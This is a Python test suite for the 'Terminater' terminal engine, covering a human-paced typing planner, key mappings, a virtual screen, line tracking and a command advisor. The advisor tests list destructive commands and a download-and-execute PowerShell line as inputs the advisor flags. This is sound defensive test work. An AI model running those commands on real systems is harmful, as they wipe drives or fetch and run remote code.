# Tlamatini — Created by Angela López Mendoza · @angelahack1
# Tlamatini Author Banner — do not remove
"""Terminater's pure text engine: the typist, the key table, the virtual screen, the
user's line tracker and the advisor.  No shell is started here -- everything is data in,
data out, so this suite is fast and fully deterministic."""
from __future__ import annotations

import random
import unicodedata

from django.test import SimpleTestCase

from . import terminater_testkit as kit


def T():
    return kit.tx()


# --------------------------------------------------------------------------- #
# the typist                                                                   #
# --------------------------------------------------------------------------- #

class TypistTests(SimpleTestCase):
    def setUp(self):
        self.t = T()
        self.saved = self.t.TEST_TIME_SCALE
        self.t.TEST_TIME_SCALE = 1.0

    def tearDown(self):
        self.t.TEST_TIME_SCALE = self.saved

    def plan(self, text="echo hello world", wpm=50, seed=7, **kw):
        return self.t.plan_typing(text, wpm=wpm, rng=random.Random(seed), **kw)

    def test_one_keystroke_per_character(self):
        self.assertEqual([k.key for k in self.plan("abc", lead_in=False)], ["a", "b", "c"])

    def test_submit_appends_enter(self):
        plan = self.plan("abc", submit=True)
        self.assertEqual(plan[-1].key, "\r")
        self.assertEqual(len(plan), 4)

    def test_no_submit_means_no_enter(self):
        self.assertNotIn("\r", [k.key for k in self.plan("abc")])

    def test_newline_becomes_enter(self):
        self.assertEqual([k.key for k in self.plan("a\nb", lead_in=False)], ["a", "\r", "b"])

    def test_crlf_is_a_single_enter(self):
        self.assertEqual([k.key for k in self.plan("a\r\nb", lead_in=False)], ["a", "\r", "b"])

    def test_combining_marks_ride_with_their_letter(self):
        plan = self.plan("e\u0301x", lead_in=False)
        self.assertEqual(len(plan), 2)
        self.assertEqual(unicodedata.normalize("NFC", plan[0].key), "\u00e9")

    def test_empty_text_has_no_keystrokes(self):
        self.assertEqual(self.plan("", lead_in=False), [])

    def test_every_key_waits_at_least_the_human_floor(self):
        """There is no paste mode: no key may follow the previous one faster than a finger can."""
        plan = self.plan("a" * 400, wpm=160, submit=True)
        self.assertGreaterEqual(min(k.delay for k in plan), self.t.MIN_KEY_DELAY_S)

    def test_instant_typing_is_structurally_impossible(self):
        for wpm in (1, 20, 160, 10_000, "999999", -50):
            plan = self.plan("x" * 50, wpm=wpm)
            self.assertGreater(self.t.plan_duration(plan), 50 * self.t.MIN_KEY_DELAY_S * 0.99, wpm)

    def test_default_speed_is_a_senior_typist(self):
        self.assertEqual(self.t.DEFAULT_WPM, 50)
        duration = self.t.plan_duration(self.plan("x" * 100, wpm=self.t.DEFAULT_WPM))
        self.assertTrue(15 < duration < 90, duration)   # about 100 chars / (50*5 keys per minute)

    def test_slower_wpm_takes_longer(self):
        slow = self.t.plan_duration(self.plan("hello there friend", wpm=20))
        fast = self.t.plan_duration(self.plan("hello there friend", wpm=160))
        self.assertGreater(slow, fast * 2)

    def test_wpm_is_clamped_to_the_documented_range(self):
        below = self.t.plan_duration(self.plan("abcdefgh", wpm=1))
        at_min = self.t.plan_duration(self.plan("abcdefgh", wpm=20))
        self.assertAlmostEqual(below, at_min, places=6)
        above = self.t.plan_duration(self.plan("abcdefgh", wpm=9999))
        at_max = self.t.plan_duration(self.plan("abcdefgh", wpm=160))
        self.assertAlmostEqual(above, at_max, places=6)

    def test_same_seed_same_schedule(self):
        self.assertEqual(self.plan("repeat me", seed=3), self.plan("repeat me", seed=3))

    def test_different_seed_different_rhythm(self):
        self.assertNotEqual([k.delay for k in self.plan("repeat me", seed=3)],
                            [k.delay for k in self.plan("repeat me", seed=4)])

    def test_rhythm_is_not_a_metronome(self):
        delays = [k.delay for k in self.plan("the quick brown fox jumps", lead_in=False)]
        self.assertGreater(len(set(round(d, 4) for d in delays)), len(delays) // 2)

    def test_lead_in_pause_before_the_first_key(self):
        with_lead = self.plan("abc", seed=11, lead_in=True)[0].delay
        self.assertGreater(with_lead, 0.35)

    def test_enter_costs_extra_thinking_time(self):
        plan = self.plan("a\nb", lead_in=False, seed=2)
        self.assertGreater(plan[1].delay, plan[0].delay * 0.9)

    def test_test_time_scale_shrinks_every_delay_and_the_floor(self):
        self.t.TEST_TIME_SCALE = 0.1
        plan = self.plan("a" * 100, submit=True)
        self.assertLess(self.t.plan_duration(plan), 6.0)
        self.assertGreaterEqual(min(k.delay for k in plan), self.t.MIN_KEY_DELAY_S * 0.1 - 1e-9)

    def test_nonsense_time_scale_is_ignored(self):
        for bad in (0, -3, 5.0):
            self.t.TEST_TIME_SCALE = bad
            plan = self.plan("a" * 30)
            self.assertGreaterEqual(min(k.delay for k in plan), self.t.MIN_KEY_DELAY_S, bad)

    def test_time_scale_is_not_reachable_from_the_engine_actions(self):
        """No action parameter may switch typing off (the knob is a module global only)."""
        engine = kit.engine()
        src = open(engine.__file__, encoding="utf-8").read()
        self.assertNotIn('TEST_TIME_SCALE', src.replace("_tx.TEST_TIME_SCALE", ""))

    def test_clamp_wpm_table(self):
        table = [(5, 20), (20, 20), (50, 50), (160, 160), (500, 160), ("75", 75), (49.9, 49),
                 (None, 50), ("abc", 50), ("", 50), (float("nan"), 50)]
        for value, expected in table:
            self.assertEqual(self.t.clamp_wpm(value), expected, value)


# --------------------------------------------------------------------------- #
# the key table                                                                #
# --------------------------------------------------------------------------- #

class KeyTableTests(SimpleTestCase):
    def setUp(self):
        self.t = T()

    def test_named_keys(self):
        for name, expected in [("enter", "\r"), ("Return", "\r"), ("tab", "\t"), ("esc", "\x1b"),
                               ("Escape", "\x1b"), ("backspace", "\x7f"), ("space", " "),
                               ("up", "\x1b[A"), ("down", "\x1b[B"), ("right", "\x1b[C"),
                               ("left", "\x1b[D"), ("home", "\x1b[H"), ("end", "\x1b[F"),
                               ("delete", "\x1b[3~"), ("pageup", "\x1b[5~"), ("pgdn", "\x1b[6~")]:
            self.assertEqual(self.t.key_bytes(name), expected, name)

    def test_function_keys(self):
        self.assertEqual(self.t.key_bytes("f1"), "\x1bOP")
        self.assertEqual(self.t.key_bytes("F5"), "\x1b[15~")
        self.assertEqual(self.t.key_bytes("f12"), "\x1b[24~")

    def test_control_letters(self):
        self.assertEqual(self.t.key_bytes("ctrl+c"), "\x03")
        self.assertEqual(self.t.key_bytes("Ctrl+C"), "\x03")
        self.assertEqual(self.t.key_bytes("control+z"), "\x1a")
        self.assertEqual(self.t.key_bytes("ctrl-d"), "\x04")
        self.assertEqual(self.t.key_bytes("ctrl + a"), "\x01")
        self.assertEqual(self.t.key_bytes("ctrl+break"), "\x03")

    def test_bare_printable_keeps_its_case(self):
        self.assertEqual(self.t.key_bytes("Y"), "Y")
        self.assertEqual(self.t.key_bytes("n"), "n")

    def test_unknown_or_empty_is_none(self):
        for bad in ("", "  ", "frobnicate", "ctrl+", None):
            self.assertIsNone(self.t.key_bytes(bad), bad)

    def test_sequence_parsing(self):
        data, bad = self.t.parse_key_sequence("ctrl+c enter")
        self.assertEqual((data, bad), (["\x03", "\r"], []))

    def test_sequence_accepts_commas_and_reports_unknown_names(self):
        data, bad = self.t.parse_key_sequence("up, up, enter, wat")
        self.assertEqual(data, ["\x1b[A", "\x1b[A", "\r"])
        self.assertEqual(bad, ["wat"])

    def test_empty_sequence(self):
        self.assertEqual(self.t.parse_key_sequence(""), ([], []))
        self.assertEqual(self.t.parse_key_sequence(None), ([], []))


# --------------------------------------------------------------------------- #
# the virtual screen                                                           #
# --------------------------------------------------------------------------- #

class VTScreenTests(SimpleTestCase):
    def screen(self, cols=20, rows=5, scrollback=100):
        return T().VTScreen(cols, rows, scrollback)

    def test_plain_text_and_newlines(self):
        s = self.screen()
        s.feed("hello\r\nworld")
        self.assertEqual(s.text(), "hello\nworld")

    def test_carriage_return_overwrites(self):
        s = self.screen()
        s.feed("abc\rX")
        self.assertEqual(s.text(), "Xbc")

    def test_backspace_moves_left(self):
        s = self.screen()
        s.feed("abc\b\bX")
        self.assertEqual(s.text(), "aXc")

    def test_absolute_cursor_position(self):
        s = self.screen()
        s.feed("\x1b[2;3Hq")
        self.assertEqual(s.visible_text(), "\n  q")

    def test_erase_display_clears_everything(self):
        s = self.screen()
        s.feed("one\r\ntwo\x1b[2J")
        self.assertEqual(s.visible_text().strip(), "")

    def test_erase_line_to_end(self):
        s = self.screen()
        s.feed("abcdef\x1b[3D\x1b[K")
        self.assertEqual(s.text(), "abc")

    def test_autowrap_rejoins_into_one_logical_line(self):
        s = self.screen(cols=5)
        s.feed("abcdefgh")
        self.assertEqual(s.text(), "abcdefgh")
        self.assertEqual(s.visible_text().count("\n"), 0)

    def test_scrollback_keeps_what_scrolled_off(self):
        s = self.screen(cols=10, rows=3)
        s.feed("".join(f"{i}\r\n" for i in range(1, 8)))
        self.assertTrue(len(s.scroll) > 0)
        text = s.text()
        for i in range(1, 8):
            self.assertIn(str(i), text)

    def test_scrollback_is_bounded(self):
        s = self.screen(cols=10, rows=3, scrollback=10)
        s.feed("".join(f"line{i}\r\n" for i in range(200)))
        self.assertLessEqual(len(s.scroll), 10)
        self.assertGreater(s.dropped, 0)

    def test_text_last_lines(self):
        s = self.screen(rows=10)
        s.feed("a\r\nb\r\nc\r\nd")
        self.assertEqual(s.text(2), "c\nd")

    def test_resize_wider_and_narrower_keeps_content(self):
        s = self.screen(cols=10, rows=4)
        s.feed("hello")
        s.resize(30, 6)
        self.assertEqual(s.text(), "hello")
        s.resize(4, 6)
        self.assertEqual(s.cols, 4)

    def test_resize_never_below_one_row_two_cols(self):
        s = self.screen()
        s.resize(0, 0)
        self.assertGreaterEqual(s.cols, 2)
        self.assertGreaterEqual(s.rows, 1)

    def test_osc_133_prompt_markers_are_reported_with_positions(self):
        s = self.screen(cols=40)
        events = s.feed("\x1b]133;A\x07PS> \x1b]133;B\x07")
        self.assertEqual([e.kind for e in events], ["A", "B"])
        self.assertEqual(events[1].col, 4)

    def test_osc_133_finished_carries_the_exit_code(self):
        s = self.screen()
        events = s.feed("\x1b]133;D;3\x07")
        self.assertEqual(events[0].kind, "D")
        self.assertEqual(events[0].arg, "3")

    def test_osc_string_terminator_variant(self):
        s = self.screen()
        events = s.feed("\x1b]133;A\x1b\\")
        self.assertEqual([e.kind for e in events], ["A"])

    def test_osc_cwd_marker(self):
        s = self.screen()
        events = s.feed('\x1b]9;9;"C:\\Users\\angel"\x07')
        self.assertEqual(s.cwd, "C:\\Users\\angel")
        self.assertEqual(events[0].kind, "cwd")

    def test_osc_title(self):
        s = self.screen()
        s.feed("\x1b]0;My Title\x07")
        self.assertEqual(s.title, "My Title")

    def test_plain_text_produces_no_osc_events(self):
        self.assertEqual(self.screen().feed("just text\r\n"), [])

    def test_sgr_colour_codes_are_not_text(self):
        s = self.screen()
        s.feed("\x1b[31mred\x1b[0m ok")
        self.assertEqual(s.text(), "red ok")

    def test_wide_characters_take_two_cells(self):
        s = self.screen(cols=20)
        s.feed("\u65e5\u672c")
        self.assertEqual(s.cx, 4)

    def test_combining_marks_do_not_advance_the_cursor(self):
        s = self.screen()
        s.feed("e\u0301")
        self.assertEqual(unicodedata.normalize("NFC", s.text()), "\u00e9")
        self.assertEqual(s.cx, 1)

    def test_cursor_line_text(self):
        s = self.screen(cols=40)
        s.feed("first\r\nPS C:\\> dir")
        self.assertEqual(s.cursor_line_text(), "PS C:\\> dir")

    def test_cursor_line_text_from_a_column(self):
        s = self.screen(cols=40)
        s.feed("PS C:\\> dir")
        self.assertEqual(s.cursor_line_text(from_col=8), "dir")

    def test_last_nonempty_line(self):
        s = self.screen(rows=6)
        s.feed("a\r\nb\r\n\r\n")
        self.assertEqual(s.last_nonempty_line(), "b")

    def test_reset_clears_everything(self):
        s = self.screen()
        s.feed("data")
        s.reset()
        self.assertEqual(s.text(), "")

    def test_garbage_never_raises(self):
        s = self.screen()
        rng = random.Random(5)
        blob = "".join(chr(rng.randrange(0, 0x250)) for _ in range(5000))
        s.feed(blob)
        s.feed("\x1b[999;999H\x1b[99999A\x1b[?1049h\x1b[2J\x1b]133;")
        self.assertIsInstance(s.text(), str)


# --------------------------------------------------------------------------- #
# the line the USER is typing                                                  #
# --------------------------------------------------------------------------- #

class LineTrackerTests(SimpleTestCase):
    def setUp(self):
        self.lt = T().LineTracker()

    def test_typing_builds_the_line(self):
        self.lt.feed("dir /w")
        self.assertEqual(self.lt.line, "dir /w")

    def test_enter_submits_and_remembers_the_line(self):
        events = self.lt.feed("ping 1.1.1.1\r")
        self.assertIn("submit", events)
        self.assertEqual(self.lt.last_line, "ping 1.1.1.1")
        self.assertEqual(self.lt.line, "")

    def test_backspace_edits(self):
        self.lt.feed("abcd\x7f\x7f")
        self.assertEqual(self.lt.line, "ab")

    def test_backspace_on_empty_line_is_harmless(self):
        self.lt.feed("\x7f\x7f")
        self.assertEqual(self.lt.line, "")

    def test_ctrl_u_clears_to_the_start(self):
        self.lt.feed("hello\x15")
        self.assertEqual(self.lt.line, "")

    def test_ctrl_w_deletes_the_previous_word(self):
        self.lt.feed("git status\x17")
        self.assertEqual(self.lt.line, "git ")

    def test_left_arrow_then_insert(self):
        self.lt.feed("abc\x1b[DX")
        self.assertEqual(self.lt.line, "abXc")

    def test_home_and_end(self):
        self.lt.feed("abc\x1b[HX\x1b[FY")
        self.assertEqual(self.lt.line, "XabcY")

    def test_ctrl_a_and_ctrl_e(self):
        self.lt.feed("abc\x01X\x05Y")
        self.assertEqual(self.lt.line, "XabcY")

    def test_delete_key(self):
        self.lt.feed("abc\x1b[H\x1b[3~")
        self.assertEqual(self.lt.line, "bc")

    def test_lone_escape_key_clears_the_line(self):
        self.lt.feed("abc")
        self.assertEqual(self.lt.feed("\x1b"), ["clear"])
        self.assertEqual(self.lt.line, "")

    def test_ctrl_c_cancels(self):
        self.lt.feed("abc")
        self.assertIn("cancel", self.lt.feed("\x03"))
        self.assertEqual(self.lt.line, "")

    def test_history_navigation_marks_the_line_uncertain(self):
        self.lt.feed("\x1b[A")
        self.assertTrue(self.lt.uncertain)

    def test_tab_completion_marks_the_line_uncertain(self):
        self.lt.feed("cd Pro\t")
        self.assertTrue(self.lt.uncertain)

    def test_bracketed_paste_is_flagged_and_newlines_become_spaces(self):
        events = self.lt.feed("\x1b[200~git\r\nstatus\x1b[201~")
        self.assertTrue(self.lt.pasted)
        self.assertEqual(self.lt.line, "git status")
        self.assertNotIn("submit", events)

    def test_short_labels_ending_in_a_colon_are_questions(self):
        for line in ("Name:", "Username: ", "Email address:", "login:", "Your name:", "Choice:"):
            with self.subTest(line=line):
                self.assertTrue(T().looks_like_input_request(line), line)

    def test_ordinary_output_is_not_mistaken_for_a_question(self):
        for line in ("", "done", "Directory of C:\\", "PS C:\\Users\\angel>", "C:\\Windows>",
                     "Downloading all of the packages that your project needs right now: 50 percent",
                     "Compiling main.c", "  1 file(s) copied."):
            with self.subTest(line=line):
                self.assertFalse(T().looks_like_input_request(line), line)

    def test_a_pasted_crlf_is_one_space_and_a_blank_line_is_two(self):
        self.lt.feed("\x1b[200~a\r\n\r\nb\x1b[201~")
        self.assertEqual(self.lt.line, "a  b")

    def test_pasted_lf_only_and_cr_only_breaks_are_one_space_each(self):
        self.lt.feed("\x1b[200~a\nb\x1b[201~")
        self.assertEqual(self.lt.line, "a b")
        self.lt.reset()
        self.lt.feed("\x1b[200~a\rb\x1b[201~")
        self.assertEqual(self.lt.line, "a b")

    def test_a_cr_then_text_then_lf_is_two_spaces(self):
        self.lt.feed("\x1b[200~a\rb\nc\x1b[201~")
        self.assertEqual(self.lt.line, "a b c")

    def test_submit_resets_uncertainty_and_paste_flags(self):
        self.lt.feed("\x1b[A\r")
        self.assertFalse(self.lt.uncertain)
        self.assertFalse(self.lt.pasted)

    def test_alt_keys_carry_no_text(self):
        self.lt.feed("a\x1bxb")
        self.assertEqual(self.lt.line, "ab")

    def test_unicode_is_kept(self):
        self.lt.feed("echo caf\u00e9")
        self.assertEqual(self.lt.line, "echo caf\u00e9")

    def test_reset(self):
        self.lt.feed("abc")
        self.lt.reset()
        self.assertEqual(self.lt.line, "")
        self.assertEqual(self.lt.last_line, "")


# --------------------------------------------------------------------------- #
# the advisor                                                                  #
# --------------------------------------------------------------------------- #

class AdvisorTests(SimpleTestCase):
    def codes(self, line, kind="cmd"):
        return [a.code for a in T().advise_line(line, kind)]

    def severities(self, line, kind="cmd"):
        return {a.code: a.severity for a in T().advise_line(line, kind)}

    def test_format_a_drive_is_danger(self):
        self.assertEqual(self.severities("format c:")["format-drive"], "danger")

    def test_rmdir_of_a_drive_root_is_danger(self):
        self.assertEqual(self.severities("rd /s /q c:\\")["rmdir-root"], "danger")

    def test_del_at_a_drive_root_is_danger(self):
        self.assertEqual(self.severities("del c:\\*")["del-root"], "danger")

    def test_powershell_recursive_remove_of_a_root_is_danger(self):
        self.assertEqual(self.severities("Remove-Item -Recurse -Force C:\\", "powershell")["ps-remove-root"], "danger")

    def test_rm_rf_root_is_danger(self):
        self.assertEqual(self.severities("rm -rf /")["rm-rf-root"], "danger")

    def test_fork_bomb_is_danger(self):
        self.assertEqual(self.severities(":(){ :|:& };:")["fork-bomb"], "danger")

    def test_disk_cmdlets_are_danger(self):
        self.assertEqual(self.severities("Format-Volume -DriveLetter D", "powershell")["ps-disk"], "danger")

    def test_diskpart_is_a_warning(self):
        self.assertEqual(self.severities("diskpart")["diskpart"], "warning")

    def test_registry_delete_is_a_warning(self):
        self.assertEqual(self.severities("reg delete HKLM\\Software\\X /f")["reg-delete"], "warning")

    def test_shutdown_is_a_warning(self):
        self.assertEqual(self.severities("shutdown /s /t 0")["power"], "warning")

    def test_download_and_execute_is_a_warning(self):
        self.assertEqual(self.severities("iwr http://x.example/a.ps1 | iex", "powershell")["remote-exec"], "warning")

    def test_harmless_commands_are_quiet(self):
        for line in ("dir", "echo hello", "cd ..", "python --version", "git status", "ping 127.0.0.1 -n 2"):
            self.assertEqual(self.codes(line), [], line)

    def test_empty_and_none_are_quiet(self):
        self.assertEqual(T().advise_line("", "cmd"), [])
        self.assertEqual(T().advise_line(None, "cmd"), [])
        self.assertEqual(T().advise_line("   ", "powershell"), [])

    def test_typo_is_a_hint_with_a_suggestion(self):
        advice = T().advise_line("gti status", "cmd")[0]
        self.assertEqual((advice.severity, advice.suggestion), ("hint", "git"))

    def test_typo_needs_arguments_to_fire(self):
        self.assertEqual(self.codes("gti"), [])

    def test_unix_habits_in_cmd(self):
        self.assertEqual(T().advise_line("ls -la", "cmd")[0].suggestion, "dir")
        self.assertEqual(T().advise_line("cat notes.txt", "cmd")[0].suggestion, "type <file>")

    def test_unix_flags_in_powershell(self):
        self.assertIn("ps-flags", self.codes("ls -la", "powershell"))
        self.assertIn("ps-rm-flags", self.codes("rm -rf build", "powershell"))

    def test_touch_in_powershell(self):
        self.assertIn("wrong-shell:touch", self.codes("touch x.txt", "powershell"))

    def test_pwsh_is_treated_as_powershell(self):
        self.assertIn("ps-flags", self.codes("ls -la", "pwsh"))

    def test_sudo_is_flagged_everywhere(self):
        self.assertIn("wrong-shell:sudo", self.codes("sudo dir", "cmd"))
        self.assertIn("wrong-shell:sudo", self.codes("sudo dir", "powershell"))

    def test_danger_comes_before_hints(self):
        advice = T().advise_line("rm -rf /", "cmd")
        self.assertEqual(advice[0].severity, "danger")

    def test_advice_is_cheap_and_pure(self):
        for _ in range(2000):
            T().advise_line("git commit -m 'x'", "powershell")


# --------------------------------------------------------------------------- #
# misc helpers                                                                 #
# --------------------------------------------------------------------------- #

class TextHelperTests(SimpleTestCase):
    def setUp(self):
        self.t = T()

    def test_strip_ansi_removes_colour_osc_and_cursor_codes(self):
        raw = "\x1b[31mred\x1b[0m \x1b]0;title\x07done\x1b[2K\x1b[1;1H"
        self.assertEqual(self.t.strip_ansi(raw), "red done")

    def test_strip_ansi_passes_plain_text_unchanged(self):
        self.assertEqual(self.t.strip_ansi("plain C:\\path"), "plain C:\\path")

    def test_strip_ansi_handles_none(self):
        self.assertEqual(self.t.strip_ansi(None), "")

    def test_input_requests_are_recognised(self):
        for line in ("Continue? [Y/N]", "Press any key to continue . . .", "Password:", "Terminate batch job (Y/N)?",
                     "Are you sure you want to delete it?", "Enter the name:", "Overwrite foo.txt? (yes/no)"):
            self.assertTrue(self.t.looks_like_input_request(line), line)

    def test_ordinary_lines_are_not_input_requests(self):
        for line in ("C:\\Users\\angel>", "Done.", "", "Directory of C:\\", "3 file(s) copied"):
            self.assertFalse(self.t.looks_like_input_request(line), line)

    def test_sanitize_title(self):
        self.assertEqual(self.t.sanitize_title("  my\x00term\n"), "my term")
        self.assertEqual(self.t.sanitize_title(""), "terminal")
        self.assertEqual(self.t.sanitize_title(None, default="x"), "x")
        self.assertEqual(len(self.t.sanitize_title("a" * 200)), 40)
